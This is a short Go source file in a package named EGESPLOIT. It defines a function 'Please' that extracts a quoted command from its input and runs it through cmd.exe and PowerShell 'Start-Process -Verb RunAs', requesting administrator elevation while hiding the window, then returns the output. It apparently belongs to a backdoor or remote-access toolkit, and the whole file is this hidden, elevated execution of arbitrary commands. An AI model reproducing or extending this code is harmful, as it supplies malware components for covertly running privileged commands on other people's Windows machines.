package EGESPLOIT


import "os/exec"
import "syscall"
import "strings"


func Please(RawCommand string) (string){

  Command := strings.Split(RawCommand, "\"");
  cmd := exec.Command("cmd", "/C", string("powershell.exe -Command Start-Process -Verb RunAs "+string(Command[1])));
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  Out, _ := cmd.Output();
  return string(Out)
}
